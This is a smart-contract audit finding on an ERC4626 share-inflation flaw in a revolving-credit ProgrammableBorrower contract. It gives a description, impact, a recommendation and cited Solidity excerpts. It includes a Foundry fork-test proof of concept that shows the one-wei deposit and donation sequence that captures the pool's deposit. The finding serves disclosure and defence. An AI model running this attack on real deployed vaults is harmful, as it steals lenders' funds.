### Title
Untrusted ERC4626 vault conversion lets a vault depositor steal revolving-credit deposits via share-price inflation - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](https://github.com/Thankgod67Ikhide/idle-tranches--019/blob/main/contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deposits all idle pool liquidity into an operator-selected ERC4626 vault without enforcing a minimum share amount or post-deposit asset value. If the configured vault is empty or vulnerable to first-depositor/donation inflation, an unprivileged vault user can inflate its share price before `startEpoch()`, cause the programmable borrower to receive zero or economically worthless shares, and redeem the attacker-controlled vault shares for the pool’s deposit. The deficit remains as vault principal loss and ultimately forces borrower default or permanent loss of LP backing.

### Finding Description
The revolving-credit deployment path accepts an arbitrary ERC4626 `vault` and validates only that its `asset()` matches the credit vault underlying. [1](#0-0) [2](#0-1)  At epoch start, the CDO transfers available underlying to the programmable borrower and invokes `onStartEpoch()`. [3](#0-2)  `onStartEpoch()` records the cash balance in `epochStartVaultAssets` and calls `_depositToVault()` for the full cash amount. [4](#0-3)  `_depositToVault()` trusts `vault.deposit()` unconditionally and does not verify `shares`, `previewDeposit()`, or `convertToAssets(shares)`. [5](#0-4) 

An attacker who is merely a depositor in the selected ERC4626 vault can front-run the first pool deposit using the standard inflation sequence: deposit one wei to receive one share, directly donate `D` underlying to the vault, and wait for `ProgrammableBorrower` to deposit `D`. If the vault calculates shares as `assets * totalSupply / totalAssets` and rounds down, the pool deposit mints `D / (D + 1) == 0` shares while the attacker’s single share is backed by approximately `2D` underlying. [5](#0-4) 

The missing shares are detected only indirectly: `_vaultNetInterest()` compares `convertToAssets(shares) + epochWithdrawnFromVault` with the pre-deposit principal baseline and reports the shortfall as a vault loss. [6](#0-5)  During a normal stop, that loss merely reduces `totalInterestDueNow()` to zero, while the principal deficit remains. [7](#0-6)  On a close, `onStopEpoch()` returns success when the required shortfall exceeds the vault position, after which IdleCDO’s `transferFrom()` fails and the CDO enters the borrower-default path. [8](#0-7) [9](#0-8) [10](#0-9) 

### Impact Explanation
This breaks pool solvency: up to the entire amount sent to the programmable borrower at epoch start can be captured by the attacker through the external vault’s inflated shares. The CDO’s strategy-token supply remains backed by the pre-deposit accounting baseline, but the programmable borrower no longer controls equivalent underlying. When the deficiency is finally recalled, the pool defaults and active lenders plus pending receipt holders are haircut through default recovery. [11](#0-10) 

For a concrete bound, if the vault is initially empty and the pool deposit is `D`, the attacker invests approximately `D + 1` underlying through a one-wei mint and donation, receives the vault’s full `2D + 1` balance on redemption, and profits approximately `D` underlying. The pool loses approximately `D` underlying.

### Likelihood Explanation
Likelihood is conditional on the configured ERC4626 vault permitting the attacker to control its initial shares or otherwise meaningfully inflate its conversion rate. The deployment code does not require the vault to have existing supply, virtual shares, or any minimum liquidity. [12](#0-11)  The attack requires no privileged role in `ProgrammableBorrower` or IdleCDO and only ordinary ERC4626 deposit plus a direct token transfer to the external vault.

Existing guards do not prevent it: `initialize()` checks only the vault asset, `_depositToVault()` has no minimum-share check, `nonReentrant` does not stop a preceding vault transaction, and the default path only crystallizes the shortfall after the attacker has already redeemed. [2](#0-1) [5](#0-4) 

### Recommendation
Require an economically meaningful mint result for every vault deposit. `_depositToVault()` should compare the returned shares with a caller-specified minimum, and ideally verify that `vault.convertToAssets(shares)` is at least the deposited amount minus a small bounded rounding tolerance. Deployment should also reject empty or inflation-susceptible ERC4626 vaults, prefer vaults with virtual-share protection or substantial existing supply, and document that the selected vault is a security-critical accounting dependency.

### Proof of Concept
The following Foundry fork test sketches the attack against a deployed revolving-credit vault whose configured ERC4626 vault is empty and uses rounding-down share conversion. Fill `CDO`, `PB`, `VAULT`, and `UNDERLYING` from the target deployment’s `CreditVaultDeployed` event, then run it with a fork RPC containing that deployment.

```solidity
// test/foundry/ProgrammableBorrowerVaultInflation.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC4626} from "../../contracts/interfaces/IERC4626.sol";
import {ProgrammableBorrower} from
  "../../contracts/strategies/idle/ProgrammableBorrower.sol";
import {IdleCDOEpochVariant} from "../../contracts/IdleCDOEpochVariant.sol";

contract ProgrammableBorrowerVaultInflationForkTest is Test {
  IdleCDOEpochVariant internal constant CDO =
    IdleCDOEpochVariant(/* deployed IdleCDOEpochVariant */);
  ProgrammableBorrower internal constant PB =
    ProgrammableBorrower(/* deployed ProgrammableBorrower */);
  IERC4626 internal constant VAULT =
    IERC4626(/* configured ERC4626 vault */);
  IERC20 internal constant UNDERLYING =
    IERC20(/* shared underlying token */);
  address internal constant MANAGER =
    address(/* honest vault manager */);

  function testFirstEpochDepositIsCapturedByInflatedVault() public {
    vm.createSelectFork(vm.envString("ETH_RPC_URL"));

    uint256 depositAmount = 1_000_000e18;
    address attacker = makeAddr("attacker");

    // The external vault must be empty/inflation-vulnerable before PB's first deposit.
    require(VAULT.totalSupply() == 0, "vault already seeded");
    require(VAULT.totalAssets() == 0, "vault already has assets");

    deal(address(UNDERLYING), attacker, depositAmount + 1);

    vm.startPrank(attacker);
    UNDERLYING.approve(address(VAULT), type(uint256).max);

    // Mint one vault share for one wei and inflate assets/share with a donation.
    VAULT.deposit(1, attacker);
    UNDERLYING.transfer(address(VAULT), depositAmount);
    vm.stopPrank();

    // Honest deposit flow sends pool cash to PB, then PB deposits it into VAULT.
    // Manager calls startEpoch after normal lender deposits and borrower approval.
    vm.prank(MANAGER);
    CDO.startEpoch();

    // PB deposited `depositAmount`, but received zero vault shares due to rounding.
    assertEq(VAULT.balanceOf(address(PB)), 0);

    // The attacker's single vault share redeems its original deposit plus PB's deposit.
    uint256 attackerBefore = UNDERLYING.balanceOf(attacker);
    vm.prank(attacker);
    VAULT.redeem(1, attacker, attacker);
    uint256 attackerProfit =
      UNDERLYING.balanceOf(attacker) - attackerBefore;

    assertGt(attackerProfit, depositAmount);
    assertEq(PB.vaultLoss(), depositAmount);
  }
}
```

The exact share arithmetic depends on the deployed vault implementation, but the failing invariant is directly testable: `VAULT.convertToAssets(VAULT.balanceOf(address(PB)))` must remain approximately equal to the amount passed to `_depositToVault()`. [5](#0-4)

### Citations

**File:** contracts/IdleCreditVaultFactory.sol (L126-141)
```text
  function deployRevolvingCreditVault(
    CreditVaultParams memory cvParams,
    StrategyData memory strategyData,
    ProgrammableBorrowerParams memory programmableBorrowerParams,
    AncillaryParams memory ancillaryParams
  ) external {
    if (ancillaryParams.writeOffImplementation != address(0)) revert WriteOffUnsupported();
    _checkMinimumFees(cvParams);
    address manager = strategyData.manager;
    if (manager == address(0)) revert Is0();

    cvParams.apr = 0;
    cvParams.isInterestMinted = true;
    cvParams.disableInstantWithdraw = true;
    cvParams.isDepositDuringEpochDisabled = true;
    (IdleCDOEpochVariant cv, IdleCreditVault strategy) = _deployBaseCreditVault(strategyData, cvParams);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L118-134)
```text
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L153-169)
```text
  /// @notice Set the vault used to deploy idle funds.
  /// @dev Owner or manager. This does not migrate an existing position. The operator must first
  /// withdraw from the old vault and wait until epoch accounting is inactive, otherwise assets can
  /// remain stranded there and the live accounting views will stop including them after the switch.
  /// @param _vault new ERC4626 vault address
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
    emit VaultUpdated(_vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L201-223)
```text
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-267)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
    }

    // `totalInterestDueNow()` was already read by IdleCDO before calling this hook, so once the
    // stop flow begins we can clear the previous carry and snapshot the remaining vault sleeve
    // as the baseline for measuring buffer-period vault PnL before the next epoch starts.
    bufferedVaultDelta = 0;
    bufferInterest = 0;
    bufferStartVaultAssets = _currentVaultAssets();

    // Stop reserving epoch-end withdraw liquidity once IdleCDO has started the stop flow.
    epochPendingWithdraws = 0;
    epochAccountingActive = false;
    emit EpochAccountingStopped();
    success = true;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L325-334)
```text
  /// @notice Total net epoch interest due to the pool at stop.
  /// @dev This is the single value read by IdleCDO to price the epoch: borrower contractual
  /// interest plus paid buffer interest plus positive vault PnL minus vault losses. It is a
  /// pool-facing value, so it can be lower than `borrowerInterestDebt` when the borrower still
  /// owes full contractual interest but the vault sleeve suffered a loss.
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L337-345)
```text
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/IdleCDOEpochVariant.sol (L270-303)
```text
    // transfer in this contract funds from interest payment (if any) and buffer deposits sent to the strategy
    uint256 _totEpochDeposits = _strategy.totEpochDeposits();
    // If interest is minted we do not transfer interest to the strategy
    uint256 _toSend = isInterestMinted ? _totEpochDeposits : lastEpochInterest + _totEpochDeposits;
    _strategy.sendInterestAndDeposits(_toSend);

    // we should first check if there are *instant* redeem requests pending 
    // and if yes we should send as much underlyings as possible to the IdleCreditVault contract
    // if there is any surplus then we send those to the borrower
    uint256 pendingInstant = _pendingInstant();
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
    }
    // allow instant withdraws right away without waiting for the deadline
    allowInstantWithdraw = true;
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
      // The borrower did not receive the funds, so keep the strategy-token backing in the strategy.
      _transferUnderlyings(address(_strategy), _toBorrower);
      _strategy.reserveDefaultRecovery(_toBorrower);
      _handleBorrowerDefault(_toBorrower);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-408)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
```

**File:** contracts/IdleCDOEpochVariant.sol (L501-505)
```text
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L669-709)
```text
    // Active holders are still represented by strategy tokens owned by the CDO. Add the
    // default-epoch net interest so they use the same claim basis as pending redeemers.
    // Split gross backing by saved NAV and default interest by the configured APR split.
    // The CDO strategy-token balance is its gross active value before `unclaimedFees`.
    // Using it directly restores those waived unpaid fees to active recovery basis.
    uint256 activeBalance = balanceOf(idleCDO);
    uint256 activeInterest = _defaultActiveInterestBasis(cdo);
    uint256 activeBasis = activeBalance + activeInterest;
    defaultBBNav = _defaultBBBasis(cdo, activeBalance, activeInterest);
    // Pending receipts have already left active CDO NAV, so they are added as a separate basis.
    uint256 pendingBasis = defaultPendingClaimBasis();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (totalBasis == 0) revert NotAllowed();

    // Some recovery funds may already be in this strategy: partially prefunded instant requests
    // and borrower-send funds that failed at epoch start. Count both without pulling them again.
    uint256 prefundedReserve = _defaultPrefundedInstantReserve();
    uint256 reserveAmount = _recoveredAmount + prefundedReserve + defaultRecoveryReserve;
    // Recovery can be above par if the recovered funds exceed the computed basis.
    uint256 recoveryPrice = reserveAmount * RECOVERY_FULL / totalBasis;

    defaultRecoveryFinalized = true;
    defaultRecoveryReserve = reserveAmount;
    defaultRecoveryPrice = recoveryPrice;
    defaultRecoveryEpoch = epochNumber;
    // A non-zero pending instant bucket means current-epoch instant receipts were not fully funded
    // and must be paid through the same recovery ratio as normal pending receipts.
    defaultInstantWithdrawsFinalized = pendingInstantWithdraws != 0;
    // Bring active CDO NAV to the same recovery ratio. IdleCDOEpochVariant then calls
    // _forceUpdateAccounting so tranche prices/virtualPrice expose the crystallized loss.
    uint256 activeFinalNAV = (activeBasis * recoveryPrice) / RECOVERY_FULL;
    defaultBBNav = defaultBBNav * recoveryPrice / RECOVERY_FULL;
    if (activeBalance > activeFinalNAV) {
      _burn(idleCDO, activeBalance - activeFinalNAV);
    } else if (activeFinalNAV > activeBalance) {
      _mint(idleCDO, activeFinalNAV - activeBalance);
    }
    if (_recoveredAmount != 0) {
      // Pull external recovery last: if the transfer fails, the whole finalization reverts.
      underlyingToken.safeTransferFrom(_recoverySource, address(this), _recoveredAmount);
    }
```
